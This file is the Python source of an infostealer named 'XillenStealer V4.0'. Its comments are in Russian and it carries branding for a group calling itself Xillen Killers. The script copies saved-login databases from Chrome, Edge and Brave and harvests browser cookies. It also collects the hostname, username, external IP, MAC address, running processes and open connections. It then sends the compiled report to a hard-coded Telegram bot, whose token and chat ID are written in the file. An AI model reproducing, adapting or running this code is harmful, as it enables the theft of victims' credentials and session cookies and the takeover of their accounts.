#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import socket
import platform
import getpass
import psutil
import uuid
import requests
import sqlite3
import shutil
import re
import traceback
from datetime import datetime
from cryptography.fernet import Fernet

# Конфигурация
TG_BOT_TOKEN = "8474305805:AAH4hGzPuca6CZ2Q7-Msrb_Ip0qu-zsh8m8"
TG_CHAT_ID = "7368280792"

def log(message):
    print(f"[LOG] {message}")

def get_ip_address():
    """Get external IP address"""
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        return ip
    except:
        try:
            ip = requests.get('https://ifconfig.me', timeout=5).text
            return ip
        except:
            return "Не удалось получить IP"

def collect_browser_passwords():
    """Collect passwords from Chrome-based browsers"""
    passwords = {}
    try:
        if platform.system() == "Windows":
            localappdata = os.environ.get('LOCALAPPDATA', '')
            browsers = {
                'Chrome': os.path.join(localappdata, 'Google', 'Chrome', 'User Data'),
                'Edge': os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data'),
                'Brave': os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data')
            }
            
            for browser_name, browser_path in browsers.items():
                if os.path.exists(browser_path):
                    try:
                        for profile in ['Default', 'Profile 1', 'Profile 2']:
                            login_data_path = os.path.join(browser_path, profile, 'Login Data')
                            if os.path.exists(login_data_path):
                                temp_db = login_data_path + '.tmp'
                                shutil.copy2(login_data_path, temp_db)
                                conn = sqlite3.connect(temp_db)
                                cursor = conn.cursor()
                                cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 50")
                                browser_passwords = []
                                for url, username, encrypted_password in cursor.fetchall():
                                    browser_passwords.append({
                                        'url': url or 'N/A',
                                        'username': username or 'N/A',
                                        'password': f"[ENCRYPTED] {encrypted_password[:20]}..." if encrypted_password else 'N/A'
                                    })
                                conn.close()
                                os.remove(temp_db)
                                if browser_passwords:
                                    if browser_name not in passwords:
                                        passwords[browser_name] = []
                                    passwords[browser_name].extend(browser_passwords)
                    except Exception as e:
                        log(f"Failed to extract {browser_name} passwords: {str(e)}")
                        continue
    except Exception as e:
        log(f"Password collection failed: {str(e)}")
    return passwords

def collect_browser_cookies():
    """Collect cookies from browsers"""
    cookies = {}
    try:
        import browser_cookie3
        browsers = ['chrome', 'firefox', 'edge', 'brave', 'opera']
        
        for browser in browsers:
            try:
                if browser == 'chrome':
                    browser_cookies = browser_cookie3.chrome()
                elif browser == 'firefox':
                    browser_cookies = browser_cookie3.firefox()
                elif browser == 'edge':
                    browser_cookies = browser_cookie3.edge()
                elif browser == 'brave':
                    browser_cookies = browser_cookie3.brave()
                elif browser == 'opera':
                    browser_cookies = browser_cookie3.opera()
                
                cookie_list = []
                for cookie in browser_cookies:
                    cookie_list.append({
                        'name': cookie.name,
                        'value': cookie.value,
                        'domain': cookie.domain,
                        'path': cookie.path
                    })
                
                if cookie_list:
                    cookies[browser.capitalize()] = cookie_list[:100]  # Ограничиваем количество
                    
            except Exception as e:
                log(f"Failed to extract {browser} cookies: {str(e)}")
                continue
                
    except Exception as e:
        log(f"Cookie collection failed: {str(e)}")
    
    return cookies

def collect_system_info():
    """Collect system information"""
    try:
        return {
            'hostname': socket.gethostname(),
            'os': f"{platform.system()} {platform.release()}",
            'architecture': platform.architecture()[0],
            'processor': platform.processor(),
            'user': getpass.getuser(),
            'cpu_count': psutil.cpu_count(),
            'memory_gb': round(psutil.virtual_memory().total / (1024**3), 2),
            'ip_address': get_ip_address(),
            'mac_address': ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        }
    except Exception as e:
        log(f"System info collection failed: {str(e)}")
        return {}

def collect_processes():
    """Collect running processes"""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
            try:
                processes.append({
                    'pid': proc.info['pid'],
                    'name': proc.info['name'],
                    'username': proc.info['username'],
                    'cpu': proc.info['cpu_percent'],
                    'memory': proc.info['memory_percent']
                })
            except:
                continue
        return processes[:100]  # Ограничиваем количество
    except Exception as e:
        log(f"Process collection failed: {str(e)}")
        return []

def collect_network_connections():
    """Collect network connections"""
    try:
        connections = []
        for conn in psutil.net_connections(kind='inet'):
            if conn.status == 'ESTABLISHED':
                connections.append({
                    'local': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else 'N/A',
                    'remote': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else 'N/A',
                    'status': conn.status,
                    'pid': conn.pid
                })
        return connections[:50]  # Ограничиваем количество
    except Exception as e:
        log(f"Network collection failed: {str(e)}")
        return []

def generate_txt_report(data):
    """Generate TXT report"""
    report = f"""
╔══════════════════════════════════════════════════════════════╗
║                   XillenStealer Report V4.0                 ║
║                 https://github.com/BengaminButton           ║
║                   t.me/Xillen_Adapter                       ║
╚══════════════════════════════════════════════════════════════╝
Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

=== СИСТЕМНАЯ ИНФОРМАЦИЯ ===
Hostname: {data['system_info'].get('hostname', 'N/A')}
OS: {data['system_info'].get('os', 'N/A')}
Архитектура: {data['system_info'].get('architecture', 'N/A')}
Процессор: {data['system_info'].get('processor', 'N/A')}
Пользователь: {data['system_info'].get('user', 'N/A')}
CPU ядер: {data['system_info'].get('cpu_count', 'N/A')}
Память: {data['system_info'].get('memory_gb', 'N/A')} GB
IP адрес: {data['system_info'].get('ip_address', 'N/A')}
MAC адрес: {data['system_info'].get('mac_address', 'N/A')}

=== ПАРОЛИ БРАУЗЕРОВ ===
"""
    
    total_passwords = 0
    for browser, browser_passwords in data['passwords'].items():
        if browser_passwords:
            report += f"\n{browser} ({len(browser_passwords)} паролей):\n"
            for i, pwd in enumerate(browser_passwords, 1):
                report += f"  {i}. URL: {pwd.get('url', 'N/A')}\n"
                report += f"     Логин: {pwd.get('username', 'N/A')}\n"
                report += f"     Пароль: {pwd.get('password', 'N/A')}\n\n"
            total_passwords += len(browser_passwords)
    
    report += f"\n=== КУКИ БРАУЗЕРОВ ===\n"
    
    total_cookies = 0
    for browser, browser_cookies in data['cookies'].items():
        if browser_cookies:
            report += f"\n{browser} ({len(browser_cookies)} куков):\n"
            for i, cookie in enumerate(browser_cookies, 1):
                report += f"  {i}. {cookie.get('name', 'N/A')} = {cookie.get('value', 'N/A')[:50]}...\n"
                report += f"     Домен: {cookie.get('domain', 'N/A')}\n"
            total_cookies += len(browser_cookies)
    
    report += f"\n=== ПРОЦЕССЫ ===\n"
    report += f"Найдено {len(data['processes'])} процессов:\n"
    for i, proc in enumerate(data['processes'], 1):
        report += f"{i}. {proc.get('name', 'N/A')} (PID: {proc.get('pid', 'N/A')})\n"
        report += f"   Пользователь: {proc.get('username', 'N/A')}\n"
        report += f"   CPU: {proc.get('cpu', 0):.1f}% | Память: {proc.get('memory', 0):.1f}%\n\n"
    
    report += f"\n=== СЕТЕВЫЕ СОЕДИНЕНИЯ ===\n"
    report += f"Найдено {len(data['network_connections'])} активных соединений:\n"
    for i, conn in enumerate(data['network_connections'], 1):
        report += f"{i}. {conn.get('local', 'N/A')} -> {conn.get('remote', 'N/A')}\n"
        report += f"   Статус: {conn.get('status', 'N/A')} | PID: {conn.get('pid', 'N/A')}\n\n"
    
    report += f"""
=== СТАТИСТИКА ===
Паролей собрано: {total_passwords}
Куков собрано: {total_cookies}
Процессов найдено: {len(data['processes'])}
Соединений найдено: {len(data['network_connections'])}

Создано командой Xillen Killers (t.me/XillenKillers) | https://github.com/BengaminButton
"""
    
    return report

def send_to_telegram(data):
    """Send data to Telegram"""
    try:
        import telebot
        bot = telebot.TeleBot(TG_BOT_TOKEN)
        
        # Генерируем отчет
        report = generate_txt_report(data)
        
        # Сохраняем в файл
        report_path = "xillen_report.txt"
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write(report)
        
        # Отправляем в Telegram
        with open(report_path, 'rb') as f:
            bot.send_document(TG_CHAT_ID, f, caption="XillenStealer Report V4.0")
        
        # Удаляем файл
        os.remove(report_path)
        
        log("Report sent to Telegram successfully!")
        return True
        
    except Exception as e:
        log(f"Failed to send to Telegram: {str(e)}")
        return False

def main():
    print("[DEBUG] Starting XillenStealer...")
    print(f"[DEBUG] Bot token: {TG_BOT_TOKEN[:10]}...")
    print(f"[DEBUG] Chat ID: {TG_CHAT_ID}")
    
    # Собираем данные
    log("Collecting system information...")
    system_info = collect_system_info()
    
    log("Collecting browser passwords...")
    passwords = collect_browser_passwords()
    
    log("Collecting browser cookies...")
    cookies = collect_browser_cookies()
    
    log("Collecting processes...")
    processes = collect_processes()
    
    log("Collecting network connections...")
    network_connections = collect_network_connections()
    
    # Объединяем данные
    collected_data = {
        'system_info': system_info,
        'passwords': passwords,
        'cookies': cookies,
        'processes': processes,
        'network_connections': network_connections
    }
    
    log("Data collection completed! Sending to Telegram...")
    
    # Отправляем в Telegram
    if send_to_telegram(collected_data):
        log("XillenStealer completed successfully!")
    else:
        log("XillenStealer completed with errors!")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        with open("xillen_crash.log", "w") as f:
            f.write(f"Critical error: {str(e)}\n{traceback.format_exc()}")


